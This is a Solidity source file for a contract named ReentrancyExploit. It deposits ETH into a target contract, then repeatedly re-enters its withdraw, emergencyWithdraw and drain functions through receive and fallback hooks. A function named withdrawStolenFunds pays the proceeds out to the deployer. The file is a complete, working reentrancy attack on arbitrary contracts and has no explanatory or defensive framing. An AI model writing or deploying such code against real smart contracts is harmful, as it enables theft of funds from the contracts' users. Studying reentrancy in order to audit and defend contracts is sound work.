// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface ITarget {
    function withdraw() external;
    function emergencyWithdraw() external;
    function drain() external;
    function deposit() external payable;
}

contract ReentrancyExploit {
    ITarget public immutable target;
    address public immutable owner;
    uint256 private attackCount = 0;
    uint256 private constant MAX_ATTACKS = 10;
    
    constructor(address _target) payable {
        target = ITarget(_target);
        owner = msg.sender;
        
        // If constructor receives ETH, deposit it to target
        if (msg.value > 0) {
            target.deposit{value: msg.value}();
        }
    }
    
    // Main attack entry point
    function beginAttack() external {
        require(msg.sender == owner, "Only owner");
        attackCount = 0;
        
        // Try all withdrawal methods
        try target.withdraw() {} catch {}
        try target.emergencyWithdraw() {} catch {}
        try target.drain() {} catch {}
    }
    
    // Reentrancy hook - gets called when target sends ETH to us
    receive() external payable {
        if (attackCount < MAX_ATTACKS && address(target).balance > 0) {
            attackCount++;
            
            // Re-enter with different functions
            if (attackCount % 3 == 0) {
                try target.withdraw() {} catch {}
            } else if (attackCount % 3 == 1) {
                try target.emergencyWithdraw() {} catch {}
            } else {
                try target.drain() {} catch {}
            }
        }
    }
    
    // Fallback for any other calls
    fallback() external payable {
        // Same as receive
        if (attackCount < MAX_ATTACKS && address(target).balance > 0) {
            attackCount++;
            try target.withdraw() {} catch {}
        }
    }
    
    // Withdraw stolen funds
    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
    
    // Check our balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
